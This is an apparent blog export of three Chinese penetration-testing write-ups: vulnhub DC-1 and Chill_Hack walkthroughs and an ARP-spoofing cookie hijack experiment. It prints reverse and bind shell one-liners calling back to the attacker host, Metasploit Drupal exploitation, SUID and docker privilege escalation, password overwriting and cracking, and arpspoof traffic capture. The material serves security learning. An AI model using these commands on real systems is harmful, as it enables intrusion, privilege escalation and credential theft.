<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>基于vulnhub的DC-1靶机的渗透测试</title>
    <url>/article/64755983.html</url>
    <content><![CDATA[<h1 id="基于vulnhub的DC-1靶机的渗透测试"><a href="#基于vulnhub的DC-1靶机的渗透测试" class="headerlink" title="基于vulnhub的DC-1靶机的渗透测试"></a>基于vulnhub的DC-1靶机的渗透测试</h1><a id="more"></a>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>靶机下载:<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
<p>DC1需要找到5个flag,最终目标是在root的主目录中找到并读取该标志！</p>
<p>kali要桥接</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/grdcAYKiPbMNpV7.png" alt=""></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看kali的IP</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501205202.png" alt=""></p>
<p>发现IP为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.101</span><br></pre></td></tr></table></figure>
<p>使用nmap扫描靶机IP</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501212931.png" alt=""></p>
<p>其中192.168.1.107是我本机IP,则靶机可能的IP为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.102</span><br><span class="line">192.168.1.103</span><br><span class="line">192.168.1.106</span><br></pre></td></tr></table></figure>
<p>接下来ping测试</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213056.png" alt=""></p>
<p>发现192.168.1.103和192.168.1.106ping不通,则靶机ip为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.102</span><br></pre></td></tr></table></figure>
<p>继续查看端口开放状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 192.168.1.102 -p- --min-rate=2000 -n -vv </span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213136.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501213221.png" alt=""></p>
<p>发现开放了22端口(ssh),80端口(http),111和60431端口,并且采用的是Drupal 7框架,有个robots.txt</p>
<h2 id="边界突破"><a href="#边界突破" class="headerlink" title="边界突破"></a>边界突破</h2><p>访问网站</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501113313.png" alt=""></p>
<p>判断为动态网站</p>
<p>查看robots.txt</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501113754.png" alt=""></p>
<p>没有发现有用的信息</p>
<p>目录扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.102</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501215026.png" alt=""></p>
<p>发现几个可疑目录</p>
<p>admin,root,user,/includes/Root,访问后如下</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501144842.png" alt=""></p>
<p>使用Metasploit framework搜索Drupal</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501215550.png" alt=""></p>
<p>尝试利用第一个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_coder_exec </span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224120.png" alt=""></p>
<p>接下来需要配置rhost,如果第一次使用可能需还要配置lhost和lport,即监听机的ip和端口</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224144.png" alt=""></p>
<p>然后<code>exploit</code> 或者 <code>run</code></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501224525.png" alt=""></p>
<p>发现失败了</p>
<p>尝试第二个,发现成功</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501225506.png" alt=""></p>
<p>执行命令shell命令获得shell</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501225936.png" alt=""></p>
<p>使用python反弹shell,获得更好的交互体验</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230108.png" alt=""></p>
<p>使用<code>ls</code>查看当前目录下文件</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230609.png" alt=""></p>
<p>发现有个flag1.txt文件,使用cat命令查看</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501230659.png" alt=""></p>
<p>flag1:“每一个好的内容管理系统 都需要一个配置文件”——配置文件里面肯定有东西</p>
<p>进入sites/dafault,发现有个settings.php</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501231119.png" alt=""></p>
<p>查看settings.php</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090130.png" alt=""></p>
<p>发现flag2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag2</span><br><span class="line">Brute force and dictionary attacks aren&#39;t the</span><br><span class="line">only ways to gain access (and you WILL need access).</span><br><span class="line">What can you do with these credentials?</span><br></pre></td></tr></table></figure>
<p>同时发现数据库的库名(drupaldb),用户名(dbuser)和密码(R0ck3t)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090619.png" alt=""></p>
<p>尝试登录数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"><span class="meta">#</span><span class="bash"> 登陆数据库</span></span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 drupaldb 数据库</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502090808.png" alt=""></p>
<p>查询users表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502091533.png" alt=""></p>
<p>发现有两个用户admin和Fred,但密码经过加密</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502091605.png" alt=""></p>
<p>退出数据库,尝试修改admin的密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/</span><br><span class="line">php scripts/password-hash.sh 123 &gt; pwd.txt</span><br><span class="line"><span class="meta">#</span><span class="bash">将123通过哈希加密</span></span><br><span class="line">cat pwd.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092100.png" alt=""></p>
<p>得到’123’哈希加密后的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$S$D0jEFt4XLx.7zA5.tCIDN2GBMsL2W6jtMxr6fE7Lt&#x2F;Mct6ctCkqD</span><br></pre></td></tr></table></figure>
<p>进入数据库,修改admin密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库</span></span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 drupaldb 数据库</span></span><br><span class="line">update users set pass = &#x27;$S$D0jEFt4XLx.7zA5.tCIDN2GBMsL2W6jtMxr6fE7Lt/Mct6ctCkqD&#x27; where name = &#x27;admin&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将密码改为123</span></span><br><span class="line">truncate flood;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果错误密码太多被锁定的话，这条语句可以解除锁定</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092505.png" alt=""></p>
<p>此时查看users表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
<p>可见admin的密码已经修改为123哈希加密后的密码</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092551.png" alt=""></p>
<p>登录网站后台</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502092737.png" alt=""></p>
<p>登录成功</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093157.png" alt=""></p>
<p>点击Find content</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093233.png" alt=""></p>
<p>发现flag3,点击edit查看</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093329.png" alt=""></p>
<p>得到flag3</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line"><span class="meta">#</span><span class="bash">提示我们使用find执行操作</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093407.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502093825.png" alt=""></p>
<p>未发现有用的信息,查看/etc/passwd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
<p>发现有个flag4的用户</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502094002.png" alt=""></p>
<p>进入flag4目录,发现有个flag4.txt,查看得到flag4</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095721.png" alt=""></p>
<p>flag4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
<p>接下来尝试获取最终flag</p>
<p>方法一:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find ./ aaa -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>
<p>得到root权限</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502094419.png" alt=""></p>
<p>方法二:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find flag4.txt -exec nc -lvp 2333 -e /bin/sh \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机开启监听</span></span><br><span class="line">nc 192.168.1.102 2333</span><br><span class="line"><span class="meta">#</span><span class="bash">渗透主机连接shell</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095521.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095600.png" alt=""></p>
<p>查看/root目录</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20210502095637.png" alt=""></p>
<p>得到thefinalflag</p>
]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>Hack</tag>
      </tags>
  </entry>
  <entry>
    <title>基于vulnhub的Chill_Hack靶机的渗透测试</title>
    <url>/article/d0f0a8c5.html</url>
    <content><![CDATA[<h1 id="基于vulnhub的Chill-Hack靶机的渗透测试"><a href="#基于vulnhub的Chill-Hack靶机的渗透测试" class="headerlink" title="基于vulnhub的Chill_Hack靶机的渗透测试"></a>基于vulnhub的Chill_Hack靶机的渗透测试</h1><a id="more"></a>
<h2 id="一-实验准备"><a href="#一-实验准备" class="headerlink" title="一.实验准备"></a>一.实验准备</h2><p>kali,Chill_Hack靶机</p>
<p>kali要选择NAT方式连接</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/gMoeEk87L2GwQhc.png" alt=""></p>
<h2 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h2><h3 id="1-收集靶机IP"><a href="#1-收集靶机IP" class="headerlink" title="1.收集靶机IP"></a>1.收集靶机IP</h3><p>查看kali的IP,如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426170748334.png" alt=""></p>
<p>用nmap扫描存活的主机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.88.0/24  </span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171053710.png" alt=""></p>
<p>判断靶机IP,根据ping测试的ttl值判断目标靶机IP为192.168.88.139</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171143353.png" alt=""></p>
<p>确定目标靶机IP是192.168.101.139</p>
<h3 id="2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态"><a href="#2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态" class="headerlink" title="2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态"></a>2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态</h3><p>使用nmap扫描相应的端口及服务的开发情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 192.168.88.139 -p- --min-rate=2000 -n -vv </span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/3u7WfI1zq2pOLbh.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/IF6QzsTh9Bkx5KR.png" alt=""></p>
<p>查询结果如下,发现21(FTP),80(HTTP),22(SSH)端口处于开放状态</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426175334078.png" alt=""></p>
<p>发现FTP服务允许匿名登录(Anonymous FTP login allowed);SSH,HTTP服务启动</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426180937065.png" alt=""></p>
<h3 id="3-根据开放的端口及服务查询相应服务的漏洞"><a href="#3-根据开放的端口及服务查询相应服务的漏洞" class="headerlink" title="3.根据开放的端口及服务查询相应服务的漏洞"></a>3.根据开放的端口及服务查询相应服务的漏洞</h3><h4 id="利用FTP服务漏洞"><a href="#利用FTP服务漏洞" class="headerlink" title="利用FTP服务漏洞"></a>利用FTP服务漏洞</h4><p>根据nmap查询结果发现21端口允许匿名用户登录,存在<a href="https://www.jianshu.com/p/9498ccf62348">匿名登录漏洞</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426175649800.png" alt=""></p>
<p>匿名登录ftp,下载并查看note.txt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.101.129</span><br><span class="line"><span class="meta">#</span><span class="bash">输入匿名用户用户名Anonymous及密码登录</span></span><br><span class="line">get note.txt #下载note.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426180549492.png" alt=""></p>
<p>并未能提供有效信息</p>
<h4 id="利用HTTP"><a href="#利用HTTP" class="headerlink" title="利用HTTP"></a>利用HTTP</h4><p>80端口是Apache httpd 2.4.29 可能存在<a href="https://cloud.tencent.com/developer/article/1676145">换行解析漏洞</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426185523428.png" alt=""></p>
<p>打开网站判断是静态网站还是动态网站,发现是个静态网站,没有可利用的后台数据库,没有漏洞点</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/WSPdvcLpRNF34hu.png" alt=""></p>
<p>继续对网站的目录进行探测(使用使用目录扫描工具dirb)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.88.139</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/QrlZORBogVxzby7.png" alt=""></p>
<p>发现secret目录,可能存在命令执行漏洞</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/HRVSi54yGpbgY6B.png" alt=""></p>
<p>浏览器输入网址,发现好像可以运行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.139&#x2F;secret&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/zZ1JTYuI8BtW6Aw.png" alt=""></p>
<p>输入ls查看当前目录下文件,发现ls命令被过滤,不允许使用</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/ZaXyHArhQ1xnpjz.png" alt=""></p>
<p>输入pwd查看当前位置</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/9PVKRD7v5nXMlWo.png" alt=""></p>
<h2 id="三-边界突破"><a href="#三-边界突破" class="headerlink" title="三.边界突破"></a>三.边界突破</h2><h3 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h3><p>使用NetCat开启监听</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure>
<p><a href="https://www.freebuf.com/articles/web/247967.html">反弹shell</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.88.136/6666 0&gt;&amp;1 #失败</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/26/xr6ykvZJIEgtlNi.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.88.136 6666&gt;/tmp/f#成功</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/e1YCjQZcLGVwB7b.png" alt=""></p>
<p>反弹shell成功</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/J6zWLx7XdiFhrtG.png" alt=""></p>
<p>使用id命令查看用户的ID,以及所属群组的ID,可以看出www-data用户权限较低</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/WZxJvmg8XQhpjT5.png" alt=""></p>
<p>进入根目录并查看</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/xlQOi9ECqhtoVHw.png" alt=""></p>
<p>查看相关目录,仍未获得有用的信息</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/ZK92yTH3rQGWJnO.png" alt=""></p>
<p>查看home目录,发现有三个用户(anurodh,apaar,aurick)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/xLRowz5KbQpe8m9.png" alt=""></p>
<p>尝试进入各用户目录,发现能进入apaar目录</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/m1eNVnqGAHOds4g.png" alt=""></p>
<p>查看apaar目录发现local.txt(无法查看),</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/cvKBTFymJCqstkg.png" alt=""></p>
<h3 id="2-横向扩展"><a href="#2-横向扩展" class="headerlink" title="2.横向扩展"></a>2.横向扩展</h3><p>使用sudo -l查看所能执行的高权限指令和文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p>发现.helpline.sh</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/gWeUCuE7mXAYc6R.png" alt=""></p>
<p>查看/home/apaar/.helpline.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /home/apaar/.helpline.sh</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/lnSWQ9TuaN81hFg.png" alt=""></p>
<p>发现该脚本允许输入,尝试输入一些命令查看local.txt</p>
<p>运行.helpline.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./.helpline.sh</span><br></pre></td></tr></table></figure>
<p>输入命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
<p>无法查看</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/IcbgH6snUFLiQJD.png" alt=""></p>
<p>尝试使用apaar用户查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u 用户名 ./.helpline.sh</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/26/51TseuLIp9WqPHR.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww&#125;</span><br></pre></td></tr></table></figure>
<p>最终拿到用户flags</p>
<p>继续尝试寻找root的flags</p>
<p>继续寻找可疑信息,发现/var/www/files下有可疑文件</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/KVMgwEY4Gtx6NCq.png" alt=""></p>
<p>查看hacker.php</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat hacker.php</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/xYzkO8smG1anLwu.png" alt=""></p>
<p>发现img标签中指向一个可以图片,使用nc下载可疑图片</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; hacker.jpg #kali新开shell</span><br><span class="line">nc 192.168.88.136 5555 &lt; images/hacker-with-laptop_23-2147985341.jpg #反弹shell中</span><br></pre></td></tr></table></figure>
<p>打开图片如下</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/9ZLNSD5MKgaWYvR.png" alt=""></p>
<p>考虑有没有可能使用隐写术隐藏关键内容</p>
<p>隐写术实例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy /b 2.jpg+1.zip output.jpg</span><br></pre></td></tr></table></figure>
<p>下载steghide工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install steghide</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/4GZH96DKicq3Q7a.png" alt=""></p>
<p>查看图片中是否隐藏有内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide info hacker.jpg</span><br></pre></td></tr></table></figure>
<p>发现其中嵌入了一个名为backup.zip的压缩包</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/8NyOtZcnaJ49qSs.png" alt=""></p>
<p>使用steghide获取该压缩包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide extract -sf hacker.jpg </span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/jXtNpaoLSscUIiR.png" alt=""></p>
<p>查看backup.zip中的内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -sf backup.zip</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/RobJ241uzjhLeT6.png" alt=""></p>
<p>尝试解压该压缩包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
<p>发现需要密码</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/NnXZfyUhDF6ri2Q.png" alt=""></p>
<p>使用John爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">先将backup.zip转换成backup.john</span></span><br><span class="line">zip2john backup.zip &gt; backup.john</span><br><span class="line"><span class="meta">#</span><span class="bash">再使用john爆破</span></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip</span><br></pre></td></tr></table></figure>
<p>发现密码为pass1word</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/2WpkaEDAVzqw91F.png" alt=""></p>
<p>解压backup.zip</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/q4ajLeMKOh6zWJ9.png" alt=""></p>
<p>获得source_code.php文件</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/QLvoqj1XDGWV7UT.png" alt=""></p>
<p>查看source_code.php,发现可疑密码和用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可疑密码:IWQwbnRLbjB3bVlwQHNzdzByZA&#x3D;&#x3D;</span><br><span class="line">用户名:Anurodh</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/YJCoa4St6RjrUEu.png" alt=""></p>
<p>到Base64解密网站解密</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/vRjZdbe4qyJUspm.png" alt=""></p>
<p>密码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!d0ntKn0wmYp@ssw0rd</span><br></pre></td></tr></table></figure>
<p>使用ssh登录,先尝试可疑用户Anurodh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh anurodh@192.168.88.139 #成功,注意名字是小写a</span><br></pre></td></tr></table></figure>
<p>登录成功</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/D5LTYFab7f31V9h.png" alt=""></p>
<p>使用id命令查看用户的ID,以及所属群组的ID,发现其中有docker</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/JVYsKEo2vwqSrPj.png" alt=""></p>
<p>尝试利用<a href="https://www.freebuf.com/articles/system/170783.html">docker漏洞</a>获取root权限(将外面的文件映射到docker容器中,docker中是以root运行的)</p>
<p>查看docker镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/nK3ZoPrD2lQGbBY.png" alt=""></p>
<p>将根目录挂载到/mnt并放入alpine镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -v /:/mnt alpine</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/1Lnopjmg2F9qDZY.png" alt=""></p>
<p>查看id</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/qdyLvrmj9XNgxcO.png" alt=""></p>
<p>查看/root没有发现信息</p>
<p>继续查看相关目录,发现/mnt下有一个root目录</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/ZrMKItUjVe2gEQ5.png" alt=""></p>
<p>进入/mnt/root并查看,发现有个proof.txt</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/oVD9MzpJ2UGA1ba.png" alt=""></p>
<p>查看proof.txt</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/Z85j6lciFKok91W.png" alt=""></p>
<p>成功得到root的flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>Hack</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>http cookies劫持实验</title>
    <url>/article/ab23bf02.html</url>
    <content><![CDATA[<h1 id="http-cookies劫持实验"><a href="#http-cookies劫持实验" class="headerlink" title="http cookies劫持实验"></a>http cookies劫持实验</h1><a id="more"></a>
<h2 id="1、首先保证虚拟机中的kali系统能够和外部网络通信"><a href="#1、首先保证虚拟机中的kali系统能够和外部网络通信" class="headerlink" title="1、首先保证虚拟机中的kali系统能够和外部网络通信"></a>1、首先保证虚拟机中的kali系统能够和外部网络通信</h2><p>查看设置——虚拟网络编辑器——桥接无线网卡—虚拟机有线设置DHCP</p>
<p><img src="https://i.loli.net/2021/04/27/zPQdo2pJO1TM4CV.png" alt=""></p>
<p><img src="https://i.loli.net/2021/04/27/A5JflRVZI4tCWpa.png" alt=""></p>
<p>ifconfig命令查看IP</p>
<p><img src="https://i.loli.net/2021/04/27/7Vziadp845wtgkA.png" alt=""></p>
<p>kali的ip为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.43.41</span><br></pre></td></tr></table></figure>
<p>ping测试</p>
<p><img src="https://i.loli.net/2021/04/27/sd8KJPNqcDHR5l2.png" alt=""></p>
<h2 id="2、扫描存活的主机"><a href="#2、扫描存活的主机" class="headerlink" title="2、扫描存活的主机"></a>2、扫描存活的主机</h2><p>使用nmap扫描存活主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v 192.168.43.0&#x2F;24</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/27/8DGa3TYmBKuHREX.png" alt=""></p>
<p>发现本机IP为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.43.55</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/27/mhdNcS9zLa1DnFo.png" alt=""></p>
<h2 id="3、用户的登录信息cookies"><a href="#3、用户的登录信息cookies" class="headerlink" title="3、用户的登录信息cookies"></a>3、用户的登录信息cookies</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward #开启kali路由转发功能</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/27/CORoeXyGJMYkLE1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.43.1 192.168.43.55  </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/27/SbU3WRszNihIVDK.png" alt=""></p>
<p>在kali打开wireshark抓包,同时在本机访问网站并登录</p>
<p>wireshark保存窃取的流量为test.pacp文件</p>
<p><img src="https://i.loli.net/2021/04/27/VtrHT6EMQDUO9Ac.png" alt=""></p>
